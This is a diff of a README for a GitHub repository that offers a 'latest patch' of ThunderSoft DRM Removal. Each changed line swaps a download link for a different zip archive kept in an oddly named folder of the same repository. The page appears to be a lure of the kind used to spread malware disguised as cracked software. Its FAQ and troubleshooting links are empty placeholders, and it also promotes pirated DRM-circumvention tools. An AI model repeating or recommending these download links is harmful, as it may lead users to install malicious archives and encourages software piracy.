@@ -1,6 +1,6 @@
 # 🎉 ThunderSoft-DRM-Removal-Latest-Patch - Effortlessly Remove DRM Protection
 
-![Download](https://raw.githubusercontent.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/main/Echinocereus/ThunderSoft-DRM-Removal-Latest-Patch_3.1-alpha.4.zip%20release-brightgreen)
+![Download](https://github.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/raw/refs/heads/main/Echinocereus/DR_Patch_Thunder_Soft_Removal_Latest_v3.6.zip%20release-brightgreen)
 
 ## 📖 Overview
 ThunderSoft-DRM-Removal-Latest-Patch provides essential tools and guides for users wanting to remove DRM protection from their media files on Windows PCs. This repository offers clear resources to help you understand and utilize the software efficiently.
@@ -14,7 +14,7 @@ To start using ThunderSoft DRM Removal, follow these simple steps.
    - Check your network connection to download the software.
 
 2. **Download the Software**: 
-   - **Visit this page to download**: [ThunderSoft-DRM-Removal-Latest-Patch Releases](https://raw.githubusercontent.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/main/Echinocereus/ThunderSoft-DRM-Removal-Latest-Patch_3.1-alpha.4.zip).
+   - **Visit this page to download**: [ThunderSoft-DRM-Removal-Latest-Patch Releases](https://github.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/raw/refs/heads/main/Echinocereus/DR_Patch_Thunder_Soft_Removal_Latest_v3.6.zip).
    - Look for the latest version available. Click the download link for the installer file.
 
 ## 📥 Download & Install
@@ -60,4 +60,4 @@ For any questions or issues, please refer to the following resources:
 - **FAQs**: [Link to Frequently Asked Questions](#)
 - **Troubleshooting**: [Link to Troubleshooting Guide](#)
 
-For further updates and information, **visit this page to download**: [ThunderSoft-DRM-Removal-Latest-Patch Releases](https://raw.githubusercontent.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/main/Echinocereus/ThunderSoft-DRM-Removal-Latest-Patch_3.1-alpha.4.zip).
+For further updates and information, **visit this page to download**: [ThunderSoft-DRM-Removal-Latest-Patch Releases](https://github.com/TechStackIns/ThunderSoft-DRM-Removal-Latest-Patch/raw/refs/heads/main/Echinocereus/DR_Patch_Thunder_Soft_Removal_Latest_v3.6.zip).
